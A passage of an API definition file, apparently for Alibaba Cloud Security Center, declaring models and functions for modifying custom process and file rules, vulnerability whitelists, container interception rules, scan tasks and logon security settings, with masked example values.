  body: ModifyClientConfStrategyResponseBody(name='body'),
}

async function modifyClientConfStrategy(request: ModifyClientConfStrategyRequest): ModifyClientConfStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyClientConfStrategy', 'POST', '/', 'json', false, 'json', request);
}

model ModifyClientUserDefineRuleRequest {
  actionType: int32(name='ActionType', description='The action of the rule. Valid values:

*   **0**: allow
*   **1**: block', example='0', position='Query'),
  cmdline?: string(name='Cmdline', description='The command line.', example='/usr/sbin/s****', position='Query'),
  filePath?: string(name='FilePath', description='The file path.', example='/etc/pam.d/su****', position='Query'),
  ip?: string(name='IP', description='The IP address.', example='1.1.XX.XX', position='Query'),
  id: long(name='Id', description='The ID of the rule.

>  You can call the [ListClientUserDefineRules](~~ListClientUserDefineRules~~) operation to query the IDs of rules.', example='210****', position='Query'),
  md5List?: string(name='Md5List', description='The hash values of processes.', example='aa5ee3ed4363c9d195a591a70281****,3e522d6f3bf5cf88bb77e9ff3d13****', position='Query'),
  name?: string(name='Name', description='The name of the rule.', example='Rule\\*\\*\\*\\*', position='Query'),
  newFilePath?: string(name='NewFilePath', description='The new file path after the file is renamed.', example='/etc/pam****', position='Query'),
  parentCmdline?: string(name='ParentCmdline', description='The parent command line.', example='/usr/sbin/s****', position='Query'),
  parentProcPath?: string(name='ParentProcPath', description='The path to the parent process.', example='C:/Windows/System32/cmd****', position='Query'),
  platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux', position='Query'),
  port?: int32(name='Port', description='The port number. This parameter is deprecated.', example='22', position='Query'),
  portStr?: string(name='PortStr', description='The port number. Valid values: 1 to 65535.', example='80', position='Query'),
  procPath?: string(name='ProcPath', description='The path to the process.', example='/root/1111/****', position='Query'),
  registryContent?: string(name='RegistryContent', description='The registry value.', example='SECOH-QAD****', position='Query'),
  registryKey?: string(name='RegistryKey', description='The registry key.', example='HKEY_DYN_****', position='Query'),
  type?: int32(name='Type', description='The type of the rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming', example='2', position='Query'),
}

model ModifyClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5cbb3c39-88ec-429a-be26-5d0f62cc****'),
}

model ModifyClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientUserDefineRuleResponseBody(name='body'),
}

async function modifyClientUserDefineRule(request: ModifyClientUserDefineRuleRequest): ModifyClientUserDefineRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyClientUserDefineRule', 'POST', '/', 'json', false, 'json', request);
}

model ModifyClusterCnnfStatusUserConfirmRequest {
  clusterIds?: [ string ](name='ClusterIds', description='The IDs of the clusters.', position='Query'),
  userConfirm?: boolean(name='UserConfirm', description='Specifies whether to fix the blocking status of the cluster. Valid values:

*   true: yes
*   false: no', example='true', position='Query'),
}

model ModifyClusterCnnfStatusUserConfirmResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4FFBEDBD-FA63-5213-9103-306519EE4857'),
}

model ModifyClusterCnnfStatusUserConfirmResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClusterCnnfStatusUserConfirmResponseBody(name='body'),
}

async function modifyClusterCnnfStatusUserConfirm(request: ModifyClusterCnnfStatusUserConfirmRequest): ModifyClusterCnnfStatusUserConfirmResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyClusterCnnfStatusUserConfirm', 'POST', '/', 'json', false, 'json', request);
}

model ModifyConcernNecessityRequest {
  concernNecessity?: string(name='ConcernNecessity', description='The priorities to fix the vulnerabilities. Valid values:

*   asap: high
*   later: medium
*   nntf: low', example='asap,nntf', position='Query'),
}

model ModifyConcernNecessityResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='F059E190-A65B-5DF8-8709-2CC7791A5B65'),
}

model ModifyConcernNecessityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyConcernNecessityResponseBody(name='body'),
}

async function modifyConcernNecessity(request: ModifyConcernNecessityRequest): ModifyConcernNecessityResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyConcernNecessity', 'POST', '/', 'json', false, 'json', request);
}

model ModifyContainerPluginRuleRequest {
  lang?: string(name='Lang', example='zh', position='Query'),
  mode?: int32(name='Mode', example='1', position='Query'),
  ruleId: int32(name='RuleId', example='100012', position='Query'),
  ruleName?: string(name='RuleName', example='test', position='Query'),
  ruleType?: int32(name='RuleType', example='0', position='Query'),
  selectedPolicy?: [ string ](name='SelectedPolicy', position='Query'),
  whiteImages?: [ string ](name='WhiteImages', position='Query'),
}

model ModifyContainerPluginRuleResponseBody = {
  data?: {
    ruleId?: long(name='RuleId', example='600640'),
    ruleName?: string(name='RuleName', example='test555'),
    switchId?: string(name='SwitchId', example='USER-CONTAINER-RULE-SWITCH-TYPE_xxx'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model ModifyContainerPluginRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyContainerPluginRuleResponseBody(name='body'),
}

async function modifyContainerPluginRule(request: ModifyContainerPluginRuleRequest): ModifyContainerPluginRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyContainerPluginRule', 'POST', '/', 'json', false, 'json', request);
}

model ModifyContainerScanConfigRequest {
  appNames?: string(name='AppNames', description='The name of the container application.', example='[\\"logtail-ds\\",\\"alicloud-monitor-controller\\",\\"storage-snapshot-manager\\"]', position='Query'),
  clusterId?: string(name='ClusterId', description='The cluster ID.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='cfb7a55a81f7246b5ac18845ea79a****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model ModifyContainerScanConfigResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  requestId?: string(name='RequestId', description='The request ID.', example='BFF355BC-8A40-55F3-8CBC-CC3E9DAC****'),
}

model ModifyContainerScanConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyContainerScanConfigResponseBody(name='body'),
}

async function modifyContainerScanConfig(request: ModifyContainerScanConfigRequest): ModifyContainerScanConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyContainerScanConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyCreateVulWhitelistRequest {
  reason?: string(name='Reason', description='The reason why you add the vulnerability to the whitelist.', example='This vulnerability is not harmful', position='Query'),
  targetInfo?: string(name='TargetInfo', description='The applicable scope of the whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the type of the applicable scope. Valid values:

    *   **GroupId**: the ID of a server group
    *   **Uuid**: the UUID of a server

*   **uuids**: the UUIDs of servers

*   **groupIds**: the IDs of server groups

>  If you leave this parameter empty, all servers are added to the whitelist. If you set the **type** field to **GroupId**, you must also specify the **groupIds** field. If you set **type** to **Uuid**, you must specify the **uuids** parameter.', example='{"type":"GroupId","uuids":[],"groupIds":[10782678]}', position='Query'),
  whitelist: string(name='Whitelist', description='The information about the vulnerability that you want to add to the whitelist. The value is a JSON string that contains the following fields:

*   **Status**: the status of the vulnerability.

*   **GmtLast**: the timestamp when the vulnerability was last detected. Unit: milliseconds.

*   **LaterCount**: the number of vulnerabilities that have the medium priority.

*   **AsapCount**: the number of vulnerabilities that have the high priority.

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerability

*   **Related**: the Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.

*   **HandledCount**: the number of handled vulnerabilities.

*   **AliasName**: the alias of the vulnerability.

*   **RuleModifyTime**: the time when the vulnerability was last disclosed.

*   **NntfCount**: the number of vulnerabilities that have the low priority.

*   **TotalFixCount**: the total number of fixed vulnerabilities.

*   **Tags**: the tag that is added to the vulnerability.

>  You can call the [DescribeGroupedVul](~~DescribeGroupedVul~~) operation to query the information about the vulnerability that you want to add to the whitelist.', example='[{"Status":0,"GmtLast":1662281929000,"LaterCount":0,"AsapCount":1,"Name":"oval:com.redhat.rhsa:def:20172836","Type":"cve","Related":"CVE-2017-14491,CVE-2017-14492,CVE-2017-14493,CVE-2017-14494,CVE-2017-14495,CVE-2017-14496","HandledCount":1,"AliasName":"RHSA-2017:2836-Critical: dnsmasq security update","RuleModifyTime":1535542395000,"NntfCount":0,"TotalFixCount":196668,"Tags":"Exploit Exists,Code Execution"},{"Status":0,"GmtLast":1662281933000,"LaterCount":0,"AsapCount":1,"Name":"oval:com.redhat.rhsa:def:20173075","Type":"cve","Related":"CVE-2017-13089,CVE-2017-13090","HandledCount":1,"AliasName":"RHSA-2017:3075-Important: wget security update","RuleModifyTime":1551432867000,"NntfCount":0,"TotalFixCount":369136,"Tags":"Code Execution"}]', position='Query'),
}

model ModifyCreateVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6B23A612-D997-5176-8C3B-D640DFD65772'),
  vulWhitelistList?: [ 
    {
      id?: long(name='Id', description='The ID of the whitelist.', example='30376'),
    }
  ](name='VulWhitelistList', description='An array that consists of the information about the whitelist.'),
}

model ModifyCreateVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCreateVulWhitelistResponseBody(name='body'),
}

async function modifyCreateVulWhitelist(request: ModifyCreateVulWhitelistRequest): ModifyCreateVulWhitelistResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyCreateVulWhitelist', 'POST', '/', 'json', false, 'json', request);
}

model ModifyCustomBlockRecordRequest {
  blockIp: string(name='BlockIp', description='The IP address that you want to specify in the policy.', example='10.12.XX.XX', position='Query'),
  bound: string(name='Bound', description='The traffic direction that you want to specify in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='out', position='Query'),
  expireTime: long(name='ExpireTime', description='The expiration time of the policy.', example='1940899881000', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  uuids: string(name='Uuids', description='The UUIDs of servers.', example='2516fe4f-adb6-45d1-87a7-90ce1213****,30746836-68d0-47f6-8b2d-c93150da****,7c3ac531-077b-46b8-8706-5c8d4e73****', position='Query'),
}

model ModifyCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EE4B1F-CEF8-5A75-86D3-D012CB3D****'),
}

model ModifyCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCustomBlockRecordResponseBody(name='body'),
}

async function modifyCustomBlockRecord(request: ModifyCustomBlockRecordRequest): ModifyCustomBlockRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyCustomBlockRecord', 'POST', '/', 'json', false, 'json', request);
}

model ModifyCycleTaskRequest {
  configId: string(name='ConfigId', description='The ID of the task configuration.

>  You can call the [DescribeCycleTaskList](~~DescribeCycleTaskList~~) operation to query the IDs of task configurations.', example='00cfa8161da093089e6804ba6a33****', position='Query'),
  enable?: int32(name='Enable', description='Specifies whether to enable the task. Valid values:

*   **1**: enables the task.
*   **0**: disables the task.', example='1', position='Query'),
  firstDateStr?: long(name='FirstDateStr', description='The time when the task first started.', example='1664380800000', position='Query'),
  intervalPeriod?: int32(name='IntervalPeriod', description='The interval at which the task is run.', example='14', position='Query'),
  param?: string(name='Param', description='The additional information.', example='{
      "targetInfo": [
            {
                  "type": "groupId",
                  "name": "TI HOST",
                  "target": 10597***
            },
            {
                  "type": "groupId",
                  "name": "expense HOST",
                  "target": 10597***
            }
      ]
}', position='Query'),
  periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**
*   **hour**', example='day', position='Query'),
  targetEndTime?: int32(name='TargetEndTime', description='The end time of the task. The time must be a time frame.', example='6', position='Query'),
  targetStartTime?: int32(name='TargetStartTime', description='The start time of the task. The start time must be a time frame.', example='0', position='Query'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus detection task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task

Valid values:

*   VIRUS_VUL_SCHEDULE_SCAN

    <!-- -->

    :

    <!-- -->

    virus detection task

    <!-- -->

*   IMAGE_SCAN

    <!-- -->

    :

    <!-- -->

    image scan task

    <!-- -->

*   EMG_VUL_SCHEDULE_SCAN

    <!-- -->

    :

    <!-- -->

    urgent vulnerability scan task

    <!-- -->', example='EMG_VUL_SCHEDULE_SCAN', position='Query'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus detection task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task

Valid values:

*   VIRUS_VUL_SCHEDULE_SCAN

    <!-- -->

    :

    <!-- -->

    virus detection task

    <!-- -->

*   IMAGE_SCAN

    <!-- -->

    :

    <!-- -->

    image scan task

    <!-- -->

*   EMG_VUL_SCHEDULE_SCAN

    <!-- -->

    :

    <!-- -->

    urgent vulnerability scan task

    <!-- -->', example='VIRUS_VUL_SCHEDULE_SCAN', position='Query'),
}

model ModifyCycleTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1AA33E30-7192-5648-93CD-D0E476A2****'),
}

model ModifyCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCycleTaskResponseBody(name='body'),
}

async function modifyCycleTask(request: ModifyCycleTaskRequest): ModifyCycleTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyCycleTask', 'POST', '/', 'json', false, 'json', request);
}

model ModifyEmgVulSubmitRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  name: string(name='Name', description='The name of the vulnerability.', example='scan:ASCV-2019-032401', position='Query'),
  userAgreement: string(name='UserAgreement', description='Specifies whether to scan for urgent vulnerabilities. Valid values:

*   **yes**
*   **no**', example='yes', position='Query'),
}

model ModifyEmgVulSubmitResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model ModifyEmgVulSubmitResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyEmgVulSubmitResponseBody(name='body'),
}

async function modifyEmgVulSubmit(request: ModifyEmgVulSubmitRequest): ModifyEmgVulSubmitResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyEmgVulSubmit', 'POST', '/', 'json', false, 'json', request);
}

model ModifyGroupPropertyRequest {
  data: string(name='Data', description='The new attributes of the server group. You can specify the following parameters to configure the attributes:

*   **groupFlag**: the type of the server group. Valid values: 0 and 1. The value **0** specifies the Default server group. The value **1** specifies other server groups.
*   **groupId**: the ID of the server group.
*   **groupIndex**: no meaning. You can leave this parameter empty.
*   **groupName**: the name of the server group. The value is the new name of the server group. The new name cannot be the same as the original name of the server group.

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to obtain the values of the groupFlag and groupId parameters. You cannot change the value of the groupFlag or groupId parameter. You can change only the value of the groupName parameter.', example='[{"groupFlag":1,"groupId":8436682,"groupIndex":,"groupName":"example"}]', position='Query'),
}

model ModifyGroupPropertyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model ModifyGroupPropertyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyGroupPropertyResponseBody(name='body'),
}

async function modifyGroupProperty(request: ModifyGroupPropertyRequest): ModifyGroupPropertyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyGroupProperty', 'POST', '/', 'json', false, 'json', request);
}

model ModifyImageFixCycleConfigRequest {
  imageFixCycle?: int32(name='ImageFixCycle', description='The cycle of the scheduled fix. Unit: day.', example='7', position='Body'),
  imageFixSwitch?: string(name='ImageFixSwitch', description='Specifies whether to enable the schedule image fix.

*   **on**: enable
*   **off**: disable', example='on', position='Body'),
  imageFixTarget?: string(name='ImageFixTarget', description='The range of the scheduled fix. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: The type of the image. The value is fixed to repo.
*   **target**: The content of the image. The value is in the format of Namespace/Image repository.', example='{\\"type\\":\\"repo\\",\\"target\\":[\\"cdp-uat/zentao\\",\\"qa-dac/yyuan9\\",\\"cafdms-qa/xxl-job-admin\\"]}', position='Body'),
  imageTimeRange?: int32(name='ImageTimeRange', description='The time range during which the image was modified. Unit: day.', example='30', position='Body'),
}

model ModifyImageFixCycleConfigResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the configurations of the scheduled image fix are modified.

*   **true**
*   **false**', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='F7A4DF7E-57A4-5BBF-8290-223754AD****'),
}

model ModifyImageFixCycleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyImageFixCycleConfigResponseBody(name='body'),
}

async function modifyImageFixCycleConfig(request: ModifyImageFixCycleConfigRequest): ModifyImageFixCycleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyImageFixCycleConfig', 'POST', '/', 'json', true, 'form', request);
}

model ModifyImageRegistryRequest {
  id?: long(name='Id', example='390103286', position='Body'),
  password?: string(name='Password', example='********************', position='Body'),
  transPerHour?: int32(name='TransPerHour', example='10', position='Body'),
  userName?: string(name='UserName', example='xxxx', position='Body'),
}

model ModifyImageRegistryResponseBody = {
  code?: string(name='Code', example='200'),
  data?: any(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='success'),
  requestId?: string(name='RequestId', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
  success?: boolean(name='Success', example='true'),
  timeCost?: long(name='TimeCost', example='1'),
}

model ModifyImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyImageRegistryResponseBody(name='body'),
}

async function modifyImageRegistry(request: ModifyImageRegistryRequest): ModifyImageRegistryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyImageRegistry', 'POST', '/', 'json', true, 'form', request);
}

model ModifyInstanceAntiBruteForceRuleRequest {
  newRuleId: long(name='NewRuleId', description='The ID of the defense rule.', example='65767', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server for which you want to modify the defense rule. You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='7cc91747-2845-40d4-bb69-c077597f****', position='Query'),
}

model ModifyInstanceAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4BE468CE-47A0-54F0-98A1-E253546E6A2C'),
}

model ModifyInstanceAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInstanceAntiBruteForceRuleResponseBody(name='body'),
}

async function modifyInstanceAntiBruteForceRule(request: ModifyInstanceAntiBruteForceRuleRequest): ModifyInstanceAntiBruteForceRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyInstanceAntiBruteForceRule', 'POST', '/', 'json', false, 'json', request);
}

model ModifyInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of container clusters.', example='c17ef568f81884cdab402decd5fcd****', position='Query'),
  dstTarget?: map[string]any(name='DstTarget', description='The destination objects of the rule. The following parameters are included:

*   targetId: the ID of the destination object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.
*   ports: the destination port ranges.', example='{"targetId":600069,"ports":["80/8088"]}', shrink='json', position='Query'),
  interceptType?: int32(name='InterceptType', description='The interception mode. Valid values:

*   **1**: block
*   **2**: alert
*   **3**: allow', example='1', position='Query'),
  orderIndex?: long(name='OrderIndex', description='The priority of the rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.', example='1', position='Query'),
  ruleId: long(name='RuleId', description='The ID of the rule.', example='500018', position='Query'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='tetsRule', position='Query'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies whether the rule is enabled. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1', position='Query'),
  srcTarget?: map[string]any(name='SrcTarget', description='The source object of the rule. The following parameters are included:

*   targetId: the ID of the source object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.', example='{"targetId":400989}', shrink='json', position='Query'),
}

model ModifyInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6961B151-B43C-533B-8B2E-1D3151D7F5B2'),
}

model ModifyInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionRuleResponseBody(name='body'),
}

async function modifyInterceptionRule(request: ModifyInterceptionRuleRequest): ModifyInterceptionRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyInterceptionRule', 'POST', '/', 'json', false, 'json', request);
}

model ModifyInterceptionRuleSwitchRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='ce5c29aba99694ade9ba85dc620b4****', position='Query'),
  ruleIds?: string(name='RuleIds', description='The IDs of the rules whose status you want to change. Separate multiple IDs with commas (,).

> You can call the [ListInterceptionRulePage](~~182997~~) operation to query the IDs of rules.', example='403287', position='Query'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies whether the rule is enabled. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1', position='Query'),
}

model ModifyInterceptionRuleSwitchResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DE725A60-95F2-50E8-8F5D-81055215E7DA'),
}

model ModifyInterceptionRuleSwitchResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionRuleSwitchResponseBody(name='body'),
}

async function modifyInterceptionRuleSwitch(request: ModifyInterceptionRuleSwitchRequest): ModifyInterceptionRuleSwitchResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyInterceptionRuleSwitch', 'POST', '/', 'json', false, 'json', request);
}

model ModifyInterceptionTargetRequest {
  appName?: string(name='AppName', description='The name of the application.

> You can call the [DescribeContainerTags](~~DescribeContainerTags~~) operation to obtain the value of this parameter.', example='yasintt-daemonst', position='Query'),
  imageList?: [ string ](name='ImageList', description='An array that consists of images.

> You can call the [DescribeContainerTags](~~DescribeContainerTags~~) operation to obtain the value of this parameter.', position='Query'),
  namespace: string(name='Namespace', description='The namespace.

> You can call the [DescribeContainerTags](~~DescribeContainerTags~~) operation to obtain the value of this parameter.', example='demo4', position='Query'),
  tagList?: [ string ](name='TagList', description='An array that consists of tags.

> You can call the [DescribeContainerTags](~~DescribeContainerTags~~) operation to obtain the value of this parameter.', position='Query'),
  targetId: long(name='TargetId', description='The ID of the network object.

> You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to obtain the value of this parameter.', example='400913', position='Query'),
  targetName: string(name='TargetName', description='The name.', example='test001', position='Query'),
  targetType: string(name='TargetType', description='The object type. Valid values:

*   **IMAGE**', example='IMAGE', position='Query'),
}

model ModifyInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='16CB4467-56AE-546C-BF19-AD4584C0DD03'),
  result?: boolean(name='Result', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionTargetResponseBody(name='body'),
}

async function modifyInterceptionTarget(request: ModifyInterceptionTargetRequest): ModifyInterceptionTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyInterceptionTarget', 'POST', '/', 'json', false, 'json', request);
}

model ModifyLogMetaStatusRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Query'),
  logStore: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.

>  You can call the [DescribeLogMeta](~~DescribeLogMeta~~) operation to query the names of Logstores.', example='aegis-log-login', position='Query'),
  project?: string(name='Project', description='The name of the project.

>  You can call the [DescribeLogMeta](~~DescribeLogMeta~~) operation to query the names of projects.', example='aegis-log', position='Query'),
  status: string(name='Status', description='The status of the log analysis feature. Valid values:

*   **enabled**
*   **disabled**', example='disabled', position='Query'),
}

model ModifyLogMetaStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='861445A7-B6D6-5825-B015-CD46ED90613A'),
}

model ModifyLogMetaStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLogMetaStatusResponseBody(name='body'),
}

async function modifyLogMetaStatus(request: ModifyLogMetaStatusRequest): ModifyLogMetaStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyLogMetaStatus', 'POST', '/', 'json', false, 'json', request);
}

model ModifyLoginBaseConfigRequest {
  config: string(name='Config', description='The details of the configuration that is used to detect unusual logons to your servers. The value of this parameter is in the JSON format and contains the following fields:

*   **totalCount**: the total number of servers.
*   **uuidCount**: the number of servers to which the configuration is applied.
*   **id**: the ID of the configuration.
*   **location**: the common logon location.

> You must specify this field if the Type parameter is set to login_common_location.

*   **ip**: the common logon IP address.

> You must specify this field if the Type parameter is set to login_common_ip.

*   **endTime**: the end time of the common logon time range.

> You must specify this field if the Type parameter is set to login_common_time.

*   **startTime**: the start time of the common logon time range.

> You must specify this field if the Type parameter is set to login_common_time.

*   **account**: the common logon account.

> You must specify this field if the Type parameter is set to login_common_account.', example='{"totalCount":174,"uuidCount":4,"location":"Montenegro","id":0}', position='Query'),
  target: string(name='Target', description='The details of the server to which the configuration is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **Target**: the UUID of the server.

*   **targetType**: the type of the server to which the configuration is applied. Valid values:

    *   **uuid**: a server
    *   **groupId**: a server group

*   **flag**: the operation that you want to perform on the server. Valid values:

    *   **del**: removes the server from the configuration.
    *   **add**: adds the server to the configuration.', example='[{"target":"inet-7c676676-06fa-442e-90fb-b802e5d6****","targetType":"uuid","flag":"add"}]', position='Query'),
  type: string(name='Type', description='The logon type of the configuration to modify. Valid values:

*   **login\\_common_location**: common logon location
*   **login\\_common_ip**: common logon IP address
*   **login\\_common_time**: common logon time range
*   **login\\_common_account**: common logon account', example='login_common_location', position='Query'),
}

model ModifyLoginBaseConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AB96FDDF-ED29-52B1-9FAE-8203F2808F24'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyLoginBaseConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLoginBaseConfigResponseBody(name='body'),
}

async function modifyLoginBaseConfig(request: ModifyLoginBaseConfigRequest): ModifyLoginBaseConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyLoginBaseConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyLoginSwitchConfigRequest {
  item: string(name='Item', description='The type of the logon security settings that you want to enable or disable. Valid values:

*   **login\\_common_ip**: unapproved logon IP addresses
*   **login\\_common_time**: unapproved logon time ranges
*   **login\\_common_account**: unapproved logon accounts', example='login_common_account', position='Query'),
  status: int32(name='Status', description='Specifies whether to enable the logon security settings. Valid values:

*   **0**: no
*   **1**: yes', example='0', position='Query'),
}

model ModifyLoginSwitchConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
}

model ModifyLoginSwitchConfigResponse = {
